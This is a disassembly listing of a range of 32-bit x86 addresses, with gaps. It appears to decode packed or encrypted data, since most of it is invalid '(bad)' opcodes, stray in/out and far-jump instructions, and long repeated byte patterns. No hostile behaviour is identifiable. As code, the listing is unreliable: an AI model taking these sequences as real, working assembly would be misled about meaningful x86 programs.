  4231ae:	vpunpcklwd ymm6,ymm0,YMMWORD PTR [esp+edx*8+0x9]
  4231b4:	pop    esi
  4231b5:	arpl   sp,cx
  4231b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231b8:	outs   dx,BYTE PTR ds:[esi]
  4231b9:	ins    BYTE PTR es:[edi],dx
  4231ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231bb:	push   edi
  4231bc:	ja     0x4231be
  4231be:	sahf   
  4231bf:	std    
  4231c0:	jo     0x423227
  4231c2:	vpunpcklwd ymm6,ymm0,YMMWORD PTR [esp+eiz*4+0x9]
  4231c8:	bound  esp,QWORD PTR [ecx+0x4b]
  4231cb:	cmc    
  4231cc:	push   ecx
  4231cd:	jb     0x423192
  4231cf:	cwde   
  4231d0:	cld    
  4231d1:	dec    DWORD PTR [eax+0x1]
  4231d4:	imul   ebp,DWORD PTR [ecx+0x11],0x2
  4231d8:	jno    0x423208
  4231da:	sti    
  4231db:	cli    
  4231dc:	push   0x0
	...
  423205:	add    BYTE PTR [eax],al
  423207:	add    BYTE PTR [edx+0x5744f5e],ah
  42320d:	lods   al,BYTE PTR ds:[esi]
  42320e:	jo     0x423282
  423210:	dec    esi
  423211:	sahf   
  423212:	cld    
  423213:	jmp    DWORD PTR [edi+0x45744f5e]
  423219:	lods   eax,DWORD PTR ds:[esi]
  42321a:	aas    
  42321b:	push   0x3e1645
  423220:	jnp    0x423280
  423222:	dec    edi
  423223:	je     0x42327a
  423225:	mov    bl,0x6b
  423227:	dec    ecx
  423228:	ds pop esp
  42322a:	mov    eax,0x3b63e3e
  42322f:	push   ecx
  423230:	ror    bh,cl
  423232:	aad    0x73
  423234:	int3   
  423235:	add    BYTE PTR [edx+ebp*8],0x3e
  423239:	jno    0x4231f3
  42323b:	jno    0x42323a
  42323d:	(bad)  
  42323e:	mov    al,0x4d
  423240:	xchg   DWORD PTR [ebx],eax
  423242:	add    DWORD PTR [esi],ecx
  423244:	aas    
  423245:	adc    eax,0xb08d71b5
  42324a:	mov    dl,0x46
  42324c:	mov    esp,eax
  42324e:	add    BYTE PTR [ecx-0x5a],dh
  423251:	test   al,0xb9
  423253:	pop    esi
  423254:	mov    gs,WORD PTR [ebx-0x67659c22]
  42325a:	add    BYTE PTR [esi],dh
  42325c:	ds fwait
  42325e:	sahf   
  42325f:	bound  esi,QWORD PTR [edx-0x67]
  423262:	mov    ds:0xf65a63,eax
  423267:	sub    bh,BYTE PTR [esi]
  423269:	loope  0x423212
  42326b:	jae    0x42326d
	...
  423295:	add    BYTE PTR [esi+0x51],dl
  423298:	mov    dh,0x73
  42329a:	pop    esp
  42329b:	fistp  DWORD PTR [esi+0xd7635e]
  4232a1:	inc    edi
  4232a2:	ds push ebp
  4232a4:	mov    ds:0xb4d75560,al
  4232a9:	(bad)  
  4232aa:	mov    ecx,0x21610461
  4232af:	and    ah,BYTE PTR [edx+0x4301d62]
  4232b5:	es ds and eax,0x1f0d6ca0
  4232bc:	mov    ch,0x6c
  4232be:	sbb    eax,0x3e73a72d
  4232c3:	add    BYTE PTR [ecx+esi*2],0x1b
  4232c7:	xchg   edx,eax
  4232c8:	test   al,0xff
  4232ca:	jns    0x423327
  4232cc:	sub    al,BYTE PTR [edi+ebp*8]
  4232cf:	aaa    
  4232d0:	or     ebp,DWORD PTR [ecx+0x3e746de]
  4232d6:	and    BYTE PTR [ebx+0x19],bl
  4232d9:	test   eax,0x3e748de
  4232de:	sti    
  4232df:	pop    edx
  4232e0:	cli    
  4232e1:	test   al,0xcd
  4232e3:	dec    ebp
  4232e4:	push   es
  4232e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232e6:	(bad)  
  4232e7:	inc    ecx
  4232e8:	div    DWORD PTR [edi+0x407d239]
  4232ee:	mov    ebp,DWORD PTR [esi]
  4232f0:	test   al,0xd6
  4232f2:	lods   eax,DWORD PTR ds:[esi]
  4232f3:	cmp    al,0xd9
  4232f5:	mov    bh,0xac
  4232f7:	dec    ebx
  4232f8:	out    0x3,eax
	...
  423322:	add    BYTE PTR [eax],al
  423324:	xchg   ebx,eax
  423325:	dec    esi
  423326:	(bad)  
  423327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423329:	mov    ?,ecx
  42332b:	loope  0x4232ca
  42332d:	aas    
  42332e:	ret    
  42332f:	add    esi,DWORD PTR [ebp+0x5b]
  423332:	fwait
  423333:	mov    ds:0xb6bc3798,al
  423338:	pop    esp
  423339:	dec    ebp
  42333a:	mov    bh,0xb5
  42333c:	pop    edx
  42333d:	cmp    DWORD PTR [eax-0x18e3a361],eax
  423343:	add    edi,DWORD PTR [ecx+0x5b]
  423346:	pushf  
  423347:	mov    eax,ds:0xa7884265
  42334c:	ins    BYTE PTR es:[edi],dx
  42334d:	dec    esi
  42334e:	mov    WORD PTR [ebp-0x5681b28f],?
  423354:	and    BYTE PTR [edi],bh
  423356:	dec    esp
  423357:	add    al,0x2d
  423359:	dec    esi
  42335a:	inc    esp
  42335b:	mov    dh,0x1c
  42335d:	inc    ecx
  42335e:	pop    ebp
  42335f:	loop   0x42337e
  423361:	aas    
  423362:	cmp    eax,DWORD PTR [esi+edi*1]
  423365:	pop    ebx
  423366:	out    0x3,eax
  423368:	ds pop ebx
  42336a:	out    0x3,eax
  42336c:	ds pop ebx
  42336e:	add    cl,ch
  423370:	cmp    eax,0x3de9005b
  423375:	pop    ebx
  423376:	add    cl,ch
  423378:	cmp    eax,0x3de9005b
  42337d:	pop    ebx
  42337e:	add    cl,ch
  423380:	cmp    eax,0x3de9005b
  423385:	pop    ebx
  423386:	add    cl,ch
	...
  4233b0:	add    BYTE PTR [eax],al
  4233b2:	cmp    eax,0x3de9005b
  4233b7:	pop    ebx
  4233b8:	add    cl,ch
  4233ba:	cmp    eax,0x3de9005b
  4233bf:	pop    ebx
  4233c0:	add    cl,ch
  4233c2:	cmp    eax,0x3de9005b
  4233c7:	pop    ebx
  4233c8:	add    cl,ch
  4233ca:	cmp    eax,0x3de9005b
  4233cf:	pop    ebx
  4233d0:	add    cl,ch
  4233d2:	cmp    eax,0x3de9005b
  4233d7:	pop    ebx
  4233d8:	add    cl,ch
  4233da:	cmp    eax,0x3de9005b
  4233df:	pop    ebx
  4233e0:	add    cl,ch
  4233e2:	cmp    eax,0x3de9005b
  4233e7:	pop    ebx
  4233e8:	add    cl,ch
  4233ea:	cmp    eax,0x3de9005b
  4233ef:	pop    ebx
  4233f0:	add    cl,ch
  4233f2:	cmp    eax,0x3de9005b
  4233f7:	pop    ebx
  4233f8:	add    cl,ch
  4233fa:	cmp    eax,0x3de9005b
  4233ff:	pop    ebx
  423400:	add    cl,ch
  423402:	cmp    eax,0x3de9005b
  423407:	pop    ebx
  423408:	add    cl,ch
  42340a:	cmp    eax,0x3de9005b
  42340f:	pop    ebx
  423410:	add    BYTE PTR [eax],al
  423412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423413:	pop    esp
	...
  423440:	xchg   edi,eax
  423441:	pop    esp
  423442:	add    BYTE PTR [eax],al
  423444:	xchg   edi,eax
  423445:	pop    esp
  423446:	add    BYTE PTR [eax],al
  423448:	addr16 pop esp
  42344a:	add    BYTE PTR [eax],al
  42344c:	addr16 pop esp
  42344e:	add    BYTE PTR [eax],al
  423450:	push   edi
  423451:	pop    esp
  423452:	add    BYTE PTR [eax],al
  423454:	push   edi
  423455:	pop    esp
  423456:	add    BYTE PTR [eax],al
  423458:	addr16 pop esp
  42345a:	add    BYTE PTR [eax],al
  42345c:	addr16 pop esp
  42345e:	add    BYTE PTR [eax],al
  423460:	push   edi
  423461:	pop    esp
  423462:	add    BYTE PTR [eax],al
  423464:	push   edi
  423465:	pop    esp
  423466:	add    BYTE PTR [eax],al
  423468:	daa    
  423469:	pop    esp
  42346a:	add    BYTE PTR [eax],al
  42346c:	daa    
  42346d:	pop    esp
  42346e:	add    BYTE PTR [eax],al
  423470:	pop    ss
  423471:	pop    esp
  423472:	add    BYTE PTR [eax],al
  423474:	pop    ss
  423475:	pop    esp
  423476:	add    BYTE PTR [eax],al
  423478:	daa    
  423479:	pop    esp
  42347a:	add    BYTE PTR [eax],al
  42347c:	daa    
  42347d:	pop    esp
  42347e:	add    BYTE PTR [eax],al
  423480:	pop    ss
  423481:	pop    esp
  423482:	add    BYTE PTR [eax],al
  423484:	pop    ss
  423485:	pop    esp
  423486:	add    BYTE PTR [eax],al
  423488:	out    0x5b,eax
  42348a:	add    BYTE PTR [eax],al
  42348c:	out    0x5b,eax
  42348e:	add    BYTE PTR [eax],al
  423490:	xlat   BYTE PTR ds:[ebx]
  423491:	pop    ebx
  423492:	add    BYTE PTR [eax],al
  423494:	mov    esp,esp
  423496:	jmp    0x4234e9
  423498:	lds    edx,FWORD PTR ds:0xe3468a08
  42349e:	dec    edx
  42349f:	push   DWORD PTR [ebp+0xc35ab5]
	...
  4234cd:	add    BYTE PTR [ebx-0x1c],ch
  4234d0:	jmp    0x423523
  4234d2:	adc    BYTE PTR [eax],ch
  4234d4:	xor    ecx,ecx
  4234d6:	sbb    ah,ah
  4234d8:	outs   dx,BYTE PTR ds:[esi]
  4234d9:	xor    BYTE PTR [ebp+0x288b0c48],dh
  4234df:	outs   dx,DWORD PTR ds:[esi]
  4234e0:	mov    DWORD PTR [esi+0x46],eax
  4234e3:	loop   0x423527
  4234e5:	cld    
  4234e6:	lds    edx,FWORD PTR [eax+0x20]
  4234e9:	mov    edx,DWORD PTR [eax-0x25]
  4234ec:	cmp    al,0x6b
  4234ee:	or     bl,BYTE PTR [eax-0x80]
  4234f1:	aas    
  4234f2:	add    eax,0x67eb0247
  4234f7:	das    
  4234f8:	pop    esi
  4234f9:	mov    esp,DWORD PTR [ebx+0x2d]
  4234fc:	ror    esp,0xb
  4234ff:	in     al,0xeb
  423501:	sub    DWORD PTR [edx+0x76],0xffffff89
  423505:	inc    ebp
  423506:	inc    esi
  423507:	loop   0x42354b
  423509:	loopne 0x4234c0
  42350b:	sbb    eax,0xbaeb8be0
  423510:	add    BYTE PTR [ecx+0x7a],dl
  423513:	in     al,0x52
  423515:	in     al,0xc5
  423517:	sbb    ah,ah
  423519:	mov    esi,DWORD PTR [esi+0x53]
  42351c:	add    DWORD PTR [ebp+0x36],ecx
  42351f:	in     al,0x4a
  423521:	clc    
  423522:	lds    ebp,FWORD PTR [eax]
  423524:	clc    
  423525:	mov    edi,DWORD PTR [edi+esi*2+0x1]
  423529:	inc    ebp
  42352a:	ss in  al,0x42
  42352d:	call   0x8c3a55e7
	...
  42355a:	add    BYTE PTR [eax],al
  42355c:	(bad)  
  42355d:	jnp    0x423560
  42355f:	push   ebp
  423560:	inc    esi
  423561:	in     al,0x52
  423563:	lock mov ch,0x18
  423566:	clc    
  423567:	mov    esi,DWORD PTR [esi+0x6f]
  42356a:	add    DWORD PTR [ebp+0x46],ecx
  42356d:	in     al,0x4a
  42356f:	cld    
  423570:	stc    
  423571:	sbb    ah,dh
  423573:	add    BYTE PTR [esi],bh
  423575:	pop    ebx
  423576:	add    bl,ch
  423578:	aaa    
  423579:	loop   0x4235cd
  42357b:	hlt    
  42357c:	mov    ebp,0xb88fe99
  423581:	(bad)  
  423582:	mov    BYTE PTR [ebp-0x5a],al
  423585:	loop   0x4235d1
  423587:	hlt    
  423588:	and    ebx,DWORD PTR gs:[eax]
  42358b:	jae    0x423593
  42358d:	loop   0x4235e1
  42358f:	lock lds ebx,FWORD PTR [ecx+0x1]
  423593:	inc    ebp
  423594:	ss in  al,0x42
  423597:	fcom   QWORD PTR [ebx*2+0x1b3cac68]
  42359e:	add    BYTE PTR [ebx-0x17b150fd],cl
  4235a4:	push   cs
  4235a5:	pop    esp
  4235a6:	add    BYTE PTR [eax],al
  4235a8:	mov    ebp,0x7e850b97
  4235ad:	dec    eax
  4235ae:	sbb    DWORD PTR [ebx+0x4588c6eb],ecx
  4235b4:	push   esi
  4235b5:	pop    esi
  4235b6:	mov    ch,0xc
  4235b8:	out    dx,al
  4235b9:	jecxz  0x423605
  4235bb:	in     al,dx
  4235bc:	lds    esp,FWORD PTR [edi]
  4235be:	in     al,dx
  4235bf:	mov    eax,DWORD PTR [eax]
	...
  4235e9:	add    BYTE PTR [ebx-0x31],bh
  4235ec:	mov    BYTE PTR [esi+ecx*8],al
  4235ef:	pop    ecx
  4235f0:	inc    ebx
  4235f1:	or     BYTE PTR ds:0xe4d8960,dl
  4235f7:	fidivr DWORD PTR [esi-0xfe038fc]
  4235fd:	jmp    0x4235e1
  4235ff:	mov    eax,eax
  423601:	mov    ebx,DWORD PTR [ebx]
  423603:	xor    cl,al
  423605:	int3   
  423606:	or     bl,BYTE PTR [edi-0x60fd3335]
  42360c:	retf   
  42360d:	int3   
  42360e:	cli    
  42360f:	sahf   
  423610:	retf   
  423611:	int3   
  423612:	mov    esp,edx
  423614:	jmp    0x423599
  423616:	jmp    0xfccd:0xd105e872
  42361d:	mov    DWORD PTR [ebx-0x29ba773d],eax
  423623:	sub    ch,al
  423625:	sub    DWORD PTR [ecx+0x7a83fccd],edi
  42362b:	push   esi
  42362c:	mov    eax,ds:0x1c31f4
  423631:	push   0x4058e2
  423636:	lds    ebx,FWORD PTR [edi]
  423638:	call   0xf4a9c78e
  42363d:	ja     0x42363e
  42363f:	pop    edx
  423640:	mov    eax,ds:0x1c09f8
  423645:	push   0x3e
  423647:	inc    ecx
  423648:	add    BYTE PTR [eax-0x7e],ch
  42364b:	pop    eax
  42364c:	inc    eax
	...
  423675:	add    BYTE PTR [eax],al
  423677:	add    BYTE PTR [ecx+0x67],ch
  42367a:	clc    
  42367b:	ja     0x42367c
  42367d:	pop    edx
  42367e:	xchg   DWORD PTR [ebp+0x66],eax
  423681:	xchg   ebp,eax
  423682:	inc    edx
  423683:	cld    
  423684:	ds pop ebx
  423686:	add    BYTE PTR [eax],al
  423688:	push   ebp
  423689:	arpl   WORD PTR [ecx-0x3e26bdab],cx
  42368f:	add    edi,eax
  423691:	es cld 
  423693:	xor    DWORD PTR [ebx+0x5f7307cf],0xffffffe0
  42369a:	inc    edx
  42369b:	cld    
  42369c:	mov    ch,0x5f
  42369e:	or     DWORD PTR [esp+edi*1-0x3aaeffe5],0x26
  4236a6:	call   0xf4a93ffd
  4236ab:	ja     0x42372c
  4236ad:	pop    ebx
  4236ae:	mov    DWORD PTR [ebp-0x6],ecx
  4236b1:	loop   0x4236b6
  4236b3:	(bad)  
  4236b4:	jmp    0x88ab:0xd5003f44
  4236bb:	in     eax,0x83
  4236bd:	cwde   
  4236be:	retf   
  4236bf:	int3   
  4236c0:	or     ah,BYTE PTR [eax-0x5ffd3335]
  4236c6:	retf   
  4236c7:	int3   
  4236c8:	cli    
  4236c9:	lahf   
  4236ca:	retf   
  4236cb:	int3   
  4236cc:	imul   esp,eax,0xffffffeb
  4236cf:	mov    eax,ds:0x3f530e
  4236d4:	jo     0x4236b6
  4236d6:	aas    
  4236d7:	xor    BYTE PTR [ebp+0x3e081e],dh
	...
  423705:	add    BYTE PTR [edi+0x7d5d0823],dh
  42370b:	lahf   
  42370c:	retf   
  42370d:	int3   
  42370e:	sbb    BYTE PTR [edi-0x60853335],0xcb
  423715:	int3   
  423716:	jmp    0x4236f7
  423718:	jmp    0x4236a5
  42371a:	add    ebx,DWORD PTR [edi+0x50]
  42371d:	mov    eax,DWORD PTR [ebx]
  42371f:	arpl   WORD PTR [edi-0x1],cx
  423722:	push   ebx
  423723:	(bad)  
  423724:	je     0x423767
  423726:	ds cs ror esp,0x8a
  42372b:	lahf   
  42372c:	retf   
  42372d:	int3   
  42372e:	sbb    BYTE PTR [edi-0x60853335],0xcb
  423735:	int3   
  423736:	jmp    0x423717
  423738:	jmp    0x4236bd
  42373a:	sub    ah,BYTE PTR [ebx+0x6a]
  42373d:	add    BYTE PTR [ebx+ebx*2+0x1b3cdc68],ah
  423744:	add    bh,bh
  423746:	dec    ebx
  423747:	shl    DWORD PTR [ecx+eax*2+0x3e],cl
  42374b:	loop   0x42378f
  42374d:	clc    
  42374e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42374f:	ret    
  423750:	add    DWORD PTR [eax+0x3e],eax
  423753:	loopne 0x423797
  423755:	clc    
  423756:	outs   dx,BYTE PTR ds:[esi]
  423757:	ret    
  423758:	mov    ecx,0x80cbf9ff
  42375d:	les    eax,FWORD PTR [esi-0x1e]
  423760:	inc    edx
  423761:	cld    
  423762:	mov    ch,0x1d
  423764:	adc    BYTE PTR [ecx-0x4b],dl
  423767:	and    eax,0x520c
	...
  423794:	lds    edx,FWORD PTR ds:0x25d15008
  42379a:	cld    
  42379b:	mov    esp,ebx
  42379d:	sub    eax,0xe06bccc1
  4237a2:	jmp    0x4237f5
  4237a4:	adc    DWORD PTR ds:0x5b3e00fc,0xe037eb00
  4237ae:	inc    edx
  4237af:	cld    
  4237b0:	mov    ebp,0x388fe9a
  4237b5:	iret   
  4237b6:	mov    BYTE PTR [ebp-0x6e],cl
  4237b9:	(bad)  
  4237ba:	dec    ebx
  4237bb:	adc    BYTE PTR ds:0x3655896c,cl
  4237c1:	pop    eax
  4237c2:	push   ebx
  4237c3:	cld    
  4237c4:	dec    ecx
  4237c5:	add    eax,0x5f038b02
  4237ca:	add    DWORD PTR [ebp+0x6a],ecx
  4237cd:	pop    ebx
  4237ce:	mov    dh,0x11
  4237d0:	and    eax,0x96077399
  4237d5:	pop    ecx
  4237d6:	add    BYTE PTR [eax],al
  4237d8:	rol    BYTE PTR ds:[ebx],0xeb
  4237dc:	outs   dx,BYTE PTR ds:[esi]
  4237dd:	xchg   eax,eax
  4237df:	mov    ebx,DWORD PTR [ebx+0x2d]
  4237e2:	ror    esp,0xa
  4237e5:	cwde   
  4237e6:	retf   
  4237e7:	int3   
  4237e8:	add    bl,BYTE PTR [eax-0x68053335]
  4237ee:	retf   
  4237ef:	int3   
  4237f0:	mov    edx,esi
  4237f2:	jmp    0x4237ad
  4237f4:	ss pop ebx
	...
  423822:	call   0x782b:0x3b8906d6
  423829:	inc    ecx
  42382a:	ds sub cl,al
  42382d:	int3   
  42382e:	or     bl,BYTE PTR [eax-0x67fd3335]
  423834:	retf   
  423835:	int3   
  423836:	cli    
  423837:	xchg   edi,eax
  423838:	retf   
  423839:	int3   
  42383a:	mov    edx,esi
  42383c:	jmp    0x4237c1
  42383e:	jmp    0x77de:0x4645896b
  423845:	add    al,0x3e
  423847:	pop    edx
  423848:	test   BYTE PTR [eax-0x74ffa4c2],cl
  42384e:	or     edx,DWORD PTR [ebx-0x77]
  423851:	push   ecx
  423852:	cmp    bl,dh
  423854:	jmp    0x86f7c761
  423859:	push   ebp
  42385a:	stos   BYTE PTR es:[edi],al
  42385b:	(bad)  
  42385c:	inc    edx
  42385d:	or     BYTE PTR [ebp-0x476f865],bh
  423863:	retf   0x45c4
  423866:	mov    bl,BYTE PTR [ebx+0x0]
  423869:	add    BYTE PTR [esi],bh
  42386b:	mov    dh,0x6
  42386d:	mov    ecx,DWORD PTR [ebx]
  42386f:	mov    DWORD PTR [eax+0x4ad43fc1],0xfc30b5fc
  423879:	cmp    ecx,DWORD PTR [ebx]
  42387b:	iret   
  42387c:	jo     0x4238c4
  42387e:	lds    esp,FWORD PTR [eax]
  423880:	cld    
  423881:	mov    eax,DWORD PTR [ebx]
  423883:	retf   
  423884:	or     al,0xb7
	...
  4238ae:	add    BYTE PTR [eax],al
  4238b0:	xor    bl,BYTE PTR [edi+edi*4]
  4238b3:	cli    
  4238b4:	xor    bl,dh
  4238b6:	stc    
  4238b7:	add    esi,DWORD PTR [ebx+0x3245898d]
  4238bd:	(bad)  
  4238be:	dec    edx
  4238bf:	lock cmp DWORD PTR [edx],edx
  4238c2:	adc    al,0x41
  4238c4:	mov    edi,0x3e0ffcbc
  4238c9:	pop    ebx
  4238ca:	xchg   DWORD PTR [ebp+0x16],edx
  4238cd:	(bad)  
  4238ce:	inc    edx
  4238cf:	or     BYTE PTR [ebp+0x36030c17],dh
  4238d5:	(bad)  
  4238d6:	push   edx
  4238d7:	clc    
  4238d8:	lds    ebx,FWORD PTR [esi+0xf]
  4238db:	add    edi,DWORD PTR [ebx+0x6b]
  4238de:	mov    DWORD PTR [ebp+0x36],ecx
  4238e1:	(bad)  
  4238e2:	push   edx
  4238e3:	or     al,0x3d
  4238e5:	ins    BYTE PTR es:[edi],dx
  4238e6:	mov    DWORD PTR [ebp-0x2a],ecx
  4238e9:	rol    DWORD PTR [ebx],cl
  4238eb:	or     ah,ch
  4238ed:	xrelease mov BYTE PTR [ebp+0x36],dl
  4238f1:	(bad)  
  4238f2:	inc    edx
  4238f3:	or     BYTE PTR ds:0x389041d,bh
  4238f9:	push   ebx
  4238fa:	out    0x6b,eax
  4238fc:	mov    cl,0xc9
  4238fe:	cld    
  4238ff:	mov    esp,DWORD PTR [ebx+0xbccc127]
  423905:	(bad)  
  423906:	jmp    0x42388b
  423908:	stos   BYTE PTR es:[edi],al
  423909:	jle    0x423894
  42390b:	inc    ebp
  42390c:	inc    esi
  42390d:	aam    0x42
  42390f:	in     al,0xb5
  423911:	pop    ss
  423912:	in     al,0x8b
	...
  42393c:	add    BYTE PTR [eax],al
  42393e:	jmp    0x4238fe
  423940:	add    BYTE PTR [ecx+0x3a],dl
  423943:	aam    0x52
  423945:	call   0x8c2a590f
  42394a:	mov    dh,0xda
  42394c:	(bad)  
  42394d:	(bad)  
  42394e:	ds aam 0x4a
  423951:	lock mov ebp,0x4100f047
  423957:	(bad)  
  423959:	add    BYTE PTR [esi],bh
  42395b:	pop    ebx
  42395c:	mov    DWORD PTR [ebp+0x36],edx
  42395f:	pop    esi
  423960:	push   ebx
  423961:	lock (bad) 
  423963:	cs loopne 0x4238f1
  423966:	jnp    0x423923
  423968:	cmp    BYTE PTR [eax+0x4e],0x5b
  42396c:	or     eax,0x5c1b84
  423971:	add    BYTE PTR [ebx+ebx*2+0x16c5006a],ah
  423978:	loopne 0x423905
  42397a:	jae    0x4239cf
  42397c:	add    DWORD PTR [ecx+0x32],edx
  42397f:	sub    eax,0x50f615fd
  423984:	aas    
  423985:	add    bh,al
  423987:	push   ds
  423988:	cld    
  423989:	mov    eax,DWORD PTR [ebx+0x3e3880bb]
  42398f:	dec    edi
  423990:	pop    ss
  423991:	mov    ecx,DWORD PTR [ebx+0x465588bb]
  423997:	pop    esp
  423998:	jns    0x45caf111
  42399e:	(bad)  
  4239a0:	dec    edx
  4239a1:	or     BYTE PTR [eax],al
	...
  4239cb:	add    BYTE PTR ds:0x3891013,bh
  4239d1:	iret   
  4239d2:	call   0xe070eeee
  4239d7:	mov    edi,ebx
  4239d9:	push   edx
  4239da:	add    DWORD PTR [edx+0x2e],eax
  4239dd:	rol    BYTE PTR [edx-0xc],cl
  4239e0:	lds    edx,FWORD PTR [esi]
  4239e2:	loopne 0x42396f
  4239e4:	repz push edx
  4239e6:	add    DWORD PTR [ecx],edx
  4239e8:	mov    bh,0x2e
  4239ea:	in     al,dx
  4239eb:	mov    DWORD PTR [ebx],0x3effffc3
  4239f1:	pop    ebx
  4239f2:	mov    DWORD PTR [ebp+0x5e],eax
  4239f5:	fdiv   QWORD PTR [edi+0x10]
  4239f8:	ds dec edi
  4239fa:	or     eax,0x80bb0b8b
  4239ff:	cmp    DWORD PTR [esi],edi
  423a01:	dec    edi
  423a02:	add    eax,0xfec303c7
  423a07:	(bad)  
  423a08:	ds pop ebx
  423a0a:	mov    DWORD PTR [ebp+0x32],edx
  423a0d:	fdivr  QWORD PTR [ecx]
  423a0f:	add    BYTE PTR [edx+0x3245893a],ch
  423a15:	aam    0x7
  423a17:	sbb    DWORD PTR [edi],0xbe00005b
  423a1d:	dec    esi
  423a1e:	sbb    al,0x8b
  423a20:	imul   ecx,edi,0xffffff88
  423a23:	add    ah,BYTE PTR [ebx-0x38]
  423a26:	cld    
  423a27:	inc    DWORD PTR [ecx-0x5b276d5]
  423a2d:	sub    eax,ebp
  423a2f:	mov    ch,0x0
	...
  423a59:	add    bl,dh
  423a5b:	(bad)  
  423a5c:	cld    
  423a5d:	add    DWORD PTR [edx],0x53
  423a60:	xchg   DWORD PTR [ebp+0x2],eax
  423a63:	mov    ah,0x1b
  423a65:	mov    esi,DWORD PTR [ebx-0x31]
  423a68:	mov    BYTE PTR [edx],al
  423a6a:	lds    edx,FWORD PTR ds:0x53728d08
  423a70:	add    dl,BYTE PTR [edx-0x4b]
  423a73:	sbb    eax,0xefa650fc
  423a78:	cli    
  423a79:	push   DWORD PTR [ecx-0x48f73c25]
  423a7f:	sbb    eax,0xcef38bdc
  423a84:	mov    BYTE PTR [ebp+0x7a],dl
  423a87:	ror    DWORD PTR [esi],1
  423a89:	mov    edi,ebx
  423a8b:	into   
  423a8c:	add    al,0x42
  423a8f:	rol    BYTE PTR [edx-0xc],cl
  423a92:	mov    ch,0x15
  423a94:	in     al,dx
  423a95:	cmp    DWORD PTR [edi+0x5e],0xffffff87
  423a99:	dec    ebp
  423a9a:	bound  esi,QWORD PTR [ebx-0x44ec746c]
  423aa0:	add    dl,0x4a
  423aa3:	rcl    BYTE PTR [edx-0x20],cl
  423aa6:	addr16 pop eax
  423aa8:	std    
  423aa9:	call   DWORD PTR [ecx-0x2d]
  423aac:	loop   0x423b0b
  423aae:	jge    0x423a46
  423ab0:	retf   
  423ab1:	int3   
  423ab2:	jmp    0x423a87
  423ab4:	jmp    0x423a39
  423ab6:	sub    dl,BYTE PTR [eax+ebp*2-0x10]
  423aba:	cmp    al,0x1b
  423abc:	add    bh,bh
	...
  423ae6:	add    BYTE PTR [eax],al
  423ae8:	push   ebx
  423ae9:	pop    ebx
  423aea:	js     0x423b2d
  423aec:	ds aam 0x42
  423aef:	clc    
  423af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423af1:	mov    DWORD PTR [ecx],0x42d23e40
  423af7:	clc    
  423af8:	outs   dx,BYTE PTR ds:[esi]
  423af9:	mov    bl,0x3d
  423afb:	std    
  423afc:	add    edi,eax
  423afe:	add    ah,0x46
  423b01:	aam    0x42
  423b03:	cld    
  423b04:	lds    ebx,FWORD PTR [eax]
  423b06:	adc    BYTE PTR [ecx-0x4b],dl
  423b09:	xor    BYTE PTR [edx+edx*2],cl
  423b0c:	mov    ch,0x20
  423b0e:	or     BYTE PTR [eax-0x27],dl
  423b11:	xor    ah,bh
  423b13:	mov    ebx,ebx
  423b15:	sub    cl,al
  423b17:	int3   
  423b18:	cli    
  423b19:	xchg   edi,eax
  423b1a:	retf   
  423b1b:	int3   
  423b1c:	imul   edx,edx,0xffffffeb
  423b1f:	mov    eax,ds:0x3f431a
  423b24:	js     0x423b81
  423b26:	push   0x782f538b
  423b2b:	inc    ecx
  423b2c:	ds aam 0x4f
  423b2f:	add    esp,ecx
  423b31:	call   0xccc1:0x283b5087
  423b38:	jp     0x423ad1
  423b3a:	retf   
  423b3b:	int3   
  423b3c:	jmp    0x423b0f
  423b3e:	jmp    0x423ac3
  423b40:	push   0x57
  423b42:	lahf   
  423b43:	push   eax
  423b44:	neg    BYTE PTR [ebx]
  423b46:	add    BYTE PTR [ebx+0x3ec78a8c],cl
	...
  423b74:	add    BYTE PTR [eax],al
  423b76:	mov    ch,0x1b
  423b78:	xor    BYTE PTR [ebx+0x3ed1d26c],cl
  423b7e:	lds    edx,FWORD PTR [ebx]
  423b80:	or     al,0x8b
  423b82:	ins    BYTE PTR es:[edi],dx
  423b83:	aam    0x4a
  423b85:	hlt    
  423b86:	mov    ch,0x20
  423b88:	hlt    
  423b89:	mov    eax,DWORD PTR [esi+0x364d8757]
  423b8f:	rcl    BYTE PTR [edx-0x8],cl
  423b92:	mov    bh,0x2f
  423b94:	cld    
  423b95:	mov    eax,0x5b3f
  423b9a:	ret    
  423b9b:	call   0xf8:0x47bd4473
  423ba2:	xchg   ebx,eax
  423ba3:	pop    edi
  423ba4:	xor    eax,eax
  423ba6:	adc    eax,0xf64d8987
  423bab:	ror    DWORD PTR [esi+0x18],1
  423bae:	xor    eax,0x47750830
  423bb3:	rol    BYTE PTR [edx-0x8],cl
  423bb6:	mov    ch,0x17
  423bb8:	or     al,0x89
  423bba:	xchg   BYTE PTR [edi-0x77],ah
  423bbd:	push   ebp
  423bbe:	(bad)  
  423bbf:	rol    DWORD PTR [edx+0x10],1
  423bc2:	mov    bh,0x18
  423bc4:	sbb    BYTE PTR [eax+0x5b3f],bh
  423bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bcb:	bound  ecx,QWORD PTR [ecx+0xed1b64d]
  423bd1:	mov    DWORD PTR [ebx],edx
  423bd3:	ret    
  423bd4:	mov    BYTE PTR [ebp-0x5a],al
  423bd7:	add    DWORD PTR [ebx-0x4],0x0
	...
  423c02:	add    BYTE PTR [eax],al
  423c04:	adc    ebx,DWORD PTR [edi+0x31]
  423c07:	shl    BYTE PTR [ebp+0x4db3e95e],0x9b
  423c0e:	mov    ch,ah
  423c10:	jecxz  0x423bab
  423c12:	retf   
  423c13:	int3   
  423c14:	mov    dl,BYTE PTR [esi-0x697d3335]
  423c1a:	retf   
  423c1b:	int3   
  423c1c:	jp     0x423bb4
  423c1e:	retf   
  423c1f:	int3   
  423c20:	or     edx,edx
  423c22:	jmp    0x423ba7
  423c24:	push   0x62
  423c26:	lds    eax,FWORD PTR [ebp+0x56]
  423c29:	pop    edx
  423c2a:	xor    BYTE PTR [eax],al
  423c2c:	xor    eax,DWORD PTR ds:[ebx+eax*1]
  423c30:	(bad)  
  423c31:	pop    edx
  423c32:	lahf   
  423c33:	cmp    al,0xb6
  423c35:	sbb    al,BYTE PTR [eax]
